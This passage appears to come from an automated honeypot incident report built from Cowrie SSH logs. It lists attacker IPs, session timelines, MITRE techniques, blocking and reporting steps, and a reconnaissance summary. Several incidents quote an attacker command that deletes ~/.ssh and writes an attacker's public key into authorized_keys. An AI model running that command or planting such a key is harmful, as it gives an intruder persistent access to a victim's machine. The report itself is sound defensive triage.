| `2026-05-12 12:28:20` | `cowrie.client.version` |
| `2026-05-12 12:28:21` | `cowrie.client.kex` |
| `2026-05-12 12:28:23` | `cowrie.login.success` |
| `2026-05-12 12:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b18a7fc4d2

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:29 |
| **Last Seen** | 2026-05-12 12:30 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:29:45` | `cowrie.session.connect` |
| `2026-05-12 12:29:46` | `cowrie.client.version` |
| `2026-05-12 12:29:46` | `cowrie.client.kex` |
| `2026-05-12 12:29:49` | `cowrie.login.success` |
| `2026-05-12 12:29:51` | `cowrie.session.params` |
| `2026-05-12 12:29:51` | `cowrie.command.input` |
| `2026-05-12 12:29:51` | `cowrie.command.failed` |
| `2026-05-12 12:29:52` | `cowrie.log.closed` |
| `2026-05-12 12:29:53` | `cowrie.session.params` |
| `2026-05-12 12:29:53` | `cowrie.command.input` |
| `2026-05-12 12:29:54` | `cowrie.session.file_download` |
| `2026-05-12 12:29:54` | `cowrie.log.closed` |
| `2026-05-12 12:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3c5259e767

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:29 |
| **Last Seen** | 2026-05-12 12:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:29:59` | `cowrie.session.connect` |
| `2026-05-12 12:30:00` | `cowrie.client.version` |
| `2026-05-12 12:30:00` | `cowrie.client.kex` |
| `2026-05-12 12:30:05` | `cowrie.login.success` |
| `2026-05-12 12:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf49a4579bd6

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:35 |
| **Last Seen** | 2026-05-12 12:35 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:35:35` | `cowrie.session.connect` |
| `2026-05-12 12:35:35` | `cowrie.client.version` |
| `2026-05-12 12:35:35` | `cowrie.client.kex` |
| `2026-05-12 12:35:37` | `cowrie.login.success` |
| `2026-05-12 12:35:39` | `cowrie.session.params` |
| `2026-05-12 12:35:39` | `cowrie.command.input` |
| `2026-05-12 12:35:39` | `cowrie.command.failed` |
| `2026-05-12 12:35:39` | `cowrie.log.closed` |
| `2026-05-12 12:35:41` | `cowrie.session.params` |
| `2026-05-12 12:35:41` | `cowrie.command.input` |
| `2026-05-12 12:35:41` | `cowrie.session.file_download` |
| `2026-05-12 12:35:41` | `cowrie.log.closed` |
| `2026-05-12 12:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1d33023242

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:35 |
| **Last Seen** | 2026-05-12 12:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:35:49` | `cowrie.session.connect` |
| `2026-05-12 12:35:49` | `cowrie.client.version` |
| `2026-05-12 12:35:50` | `cowrie.client.kex` |
| `2026-05-12 12:35:53` | `cowrie.login.success` |
| `2026-05-12 12:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04cbe5665edf

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:37 |
| **Last Seen** | 2026-05-12 12:37 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:37:22` | `cowrie.session.connect` |
| `2026-05-12 12:37:22` | `cowrie.client.version` |
| `2026-05-12 12:37:23` | `cowrie.client.kex` |
| `2026-05-12 12:37:25` | `cowrie.login.success` |
| `2026-05-12 12:37:27` | `cowrie.session.params` |
| `2026-05-12 12:37:27` | `cowrie.command.input` |
| `2026-05-12 12:37:27` | `cowrie.command.failed` |
| `2026-05-12 12:37:28` | `cowrie.log.closed` |
| `2026-05-12 12:37:29` | `cowrie.session.params` |
| `2026-05-12 12:37:29` | `cowrie.command.input` |
| `2026-05-12 12:37:31` | `cowrie.session.file_download` |
| `2026-05-12 12:37:31` | `cowrie.log.closed` |
| `2026-05-12 12:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6372993ecc5d

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:37 |
| **Last Seen** | 2026-05-12 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:37:37` | `cowrie.session.connect` |
| `2026-05-12 12:37:37` | `cowrie.client.version` |
| `2026-05-12 12:37:38` | `cowrie.client.kex` |
| `2026-05-12 12:37:41` | `cowrie.login.success` |
| `2026-05-12 12:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896b13485794

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:40 |
| **Last Seen** | 2026-05-12 12:41 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:40:44` | `cowrie.session.connect` |
| `2026-05-12 12:40:44` | `cowrie.client.version` |
| `2026-05-12 12:40:46` | `cowrie.client.kex` |
| `2026-05-12 12:40:49` | `cowrie.login.success` |
| `2026-05-12 12:40:50` | `cowrie.session.params` |
| `2026-05-12 12:40:50` | `cowrie.command.input` |
| `2026-05-12 12:40:50` | `cowrie.command.failed` |
| `2026-05-12 12:40:51` | `cowrie.log.closed` |
| `2026-05-12 12:40:52` | `cowrie.session.params` |
| `2026-05-12 12:40:52` | `cowrie.command.input` |
| `2026-05-12 12:40:52` | `cowrie.session.file_download` |
| `2026-05-12 12:40:52` | `cowrie.log.closed` |
| `2026-05-12 12:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463a53fc1f72

| Field | Detail |
|---|---|
| **Source IP** | `90.150.68[.]44` |
| **First Seen** | 2026-05-12 12:40 |
| **Last Seen** | 2026-05-12 12:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 12:40:57` | `cowrie.session.connect` |
| `2026-05-12 12:40:58` | `cowrie.client.version` |
| `2026-05-12 12:40:59` | `cowrie.client.kex` |
| `2026-05-12 12:41:01` | `cowrie.login.success` |
| `2026-05-12 12:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.150.68[.]44` to AbuseIPDB if not already reported
- [ ] Block `90.150.68[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa704238e3e

| Field | Detail |
|---|---|
| **Source IP** | `219.79.56[.]86` |
| **First Seen** | 2026-05-12 14:21 |
| **Last Seen** | 2026-05-12 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:21:27` | `cowrie.session.connect` |
| `2026-05-12 14:21:27` | `cowrie.client.version` |
| `2026-05-12 14:21:27` | `cowrie.client.kex` |
| `2026-05-12 14:21:28` | `cowrie.login.success` |
| `2026-05-12 14:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.79.56[.]86` to AbuseIPDB if not already reported
- [ ] Block `219.79.56[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b08f89dd3f

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:23 |
| **Last Seen** | 2026-05-12 14:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:23:05` | `cowrie.session.connect` |
| `2026-05-12 14:23:05` | `cowrie.client.version` |
| `2026-05-12 14:23:05` | `cowrie.client.kex` |
| `2026-05-12 14:23:05` | `cowrie.login.success` |
| `2026-05-12 14:23:06` | `cowrie.session.params` |
| `2026-05-12 14:23:06` | `cowrie.command.input` |
| `2026-05-12 14:23:06` | `cowrie.command.failed` |
| `2026-05-12 14:23:06` | `cowrie.log.closed` |
| `2026-05-12 14:23:06` | `cowrie.session.params` |
| `2026-05-12 14:23:06` | `cowrie.command.input` |
| `2026-05-12 14:23:06` | `cowrie.session.file_download` |
| `2026-05-12 14:23:06` | `cowrie.log.closed` |
| `2026-05-12 14:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae72d89fcb1

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:23 |
| **Last Seen** | 2026-05-12 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:23:08` | `cowrie.session.connect` |
| `2026-05-12 14:23:08` | `cowrie.client.version` |
| `2026-05-12 14:23:08` | `cowrie.client.kex` |
| `2026-05-12 14:23:09` | `cowrie.login.success` |
| `2026-05-12 14:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd2ceb012682

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:25 |
| **Last Seen** | 2026-05-12 14:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:25:08` | `cowrie.session.connect` |
| `2026-05-12 14:25:08` | `cowrie.client.version` |
| `2026-05-12 14:25:09` | `cowrie.client.kex` |
| `2026-05-12 14:25:09` | `cowrie.login.success` |
| `2026-05-12 14:25:09` | `cowrie.session.params` |
| `2026-05-12 14:25:09` | `cowrie.command.input` |
| `2026-05-12 14:25:09` | `cowrie.command.failed` |
| `2026-05-12 14:25:09` | `cowrie.log.closed` |
| `2026-05-12 14:25:10` | `cowrie.session.params` |
| `2026-05-12 14:25:10` | `cowrie.command.input` |
| `2026-05-12 14:25:10` | `cowrie.session.file_download` |
| `2026-05-12 14:25:10` | `cowrie.log.closed` |
| `2026-05-12 14:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cdaf5304320

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:25 |
| **Last Seen** | 2026-05-12 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:25:12` | `cowrie.session.connect` |
| `2026-05-12 14:25:12` | `cowrie.client.version` |
| `2026-05-12 14:25:12` | `cowrie.client.kex` |
| `2026-05-12 14:25:13` | `cowrie.login.success` |
| `2026-05-12 14:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca81201b6739

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:27 |
| **Last Seen** | 2026-05-12 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:27:08` | `cowrie.session.connect` |
| `2026-05-12 14:27:08` | `cowrie.client.version` |
| `2026-05-12 14:27:08` | `cowrie.client.kex` |
| `2026-05-12 14:27:08` | `cowrie.login.success` |
| `2026-05-12 14:27:09` | `cowrie.session.params` |
| `2026-05-12 14:27:09` | `cowrie.command.input` |
| `2026-05-12 14:27:09` | `cowrie.command.failed` |
| `2026-05-12 14:27:09` | `cowrie.log.closed` |
| `2026-05-12 14:27:09` | `cowrie.session.params` |
| `2026-05-12 14:27:09` | `cowrie.command.input` |
| `2026-05-12 14:27:09` | `cowrie.session.file_download` |
| `2026-05-12 14:27:09` | `cowrie.log.closed` |
| `2026-05-12 14:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4dccc57a702

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-05-12 14:27 |
| **Last Seen** | 2026-05-12 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 14:27:11` | `cowrie.session.connect` |
| `2026-05-12 14:27:11` | `cowrie.client.version` |
| `2026-05-12 14:27:11` | `cowrie.client.kex` |
| `2026-05-12 14:27:12` | `cowrie.login.success` |
| `2026-05-12 14:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **939** | 2026-05-12 10:35 | 2026-05-12 14:32 | 476m | 0 | `T1592` | 🟠 MEDIUM |
| `54.37.229[.]48` | **20** | 2026-05-12 10:59 | 2026-05-12 11:24 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `90.150.68[.]44` | **20** | 2026-05-12 11:10 | 2026-05-12 12:40 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `219.79.56[.]86` | **14** | 2026-05-12 14:21 | 2026-05-12 14:21 | 0m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `88.142.46[.]185` | **4** | 2026-05-12 13:51 | 2026-05-12 14:27 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `124.228.34[.]69` | **2** | 2026-05-12 11:23 | 2026-05-12 11:25 | 4m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-12 12:04 | 2026-05-12 12:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]46` | **2** | 2026-05-12 11:37 | 2026-05-12 11:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.20.223[.]56` | 1 | 2026-05-12 11:39 | 2026-05-12 11:39 | 3s | 0 | `T1592` | 🟢 LOW |
| `103.250.11[.]116` | 1 | 2026-05-12 11:34 | 2026-05-12 11:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.12.54[.]56` | 1 | 2026-05-12 11:13 | 2026-05-12 11:13 | 7s | 0 | `T1592` | 🟢 LOW |
| `114.35.208[.]214` | 1 | 2026-05-12 10:40 | 2026-05-12 10:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `124.163.255[.]210` | 1 | 2026-05-12 11:36 | 2026-05-12 11:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.18.182[.]99` | 1 | 2026-05-12 12:25 | 2026-05-12 12:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.114[.]234` | 1 | 2026-05-12 12:21 | 2026-05-12 12:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.71.44[.]99` | 1 | 2026-05-12 13:16 | 2026-05-12 13:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.234.190[.]223` | 1 | 2026-05-12 12:55 | 2026-05-12 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.233[.]159` | 1 | 2026-05-12 12:22 | 2026-05-12 12:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.91.220[.]148` | 1 | 2026-05-12 11:24 | 2026-05-12 11:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `186.137.131[.]237` | 1 | 2026-05-12 11:14 | 2026-05-12 11:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `186.31.95[.]163` | 1 | 2026-05-12 12:25 | 2026-05-12 12:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.4.3[.]135` | 1 | 2026-05-12 11:47 | 2026-05-12 11:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.112.133[.]74` | 1 | 2026-05-12 11:25 | 2026-05-12 11:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]88` | 1 | 2026-05-12 12:46 | 2026-05-12 12:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.149.50[.]126` | 1 | 2026-05-12 12:08 | 2026-05-12 12:08 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

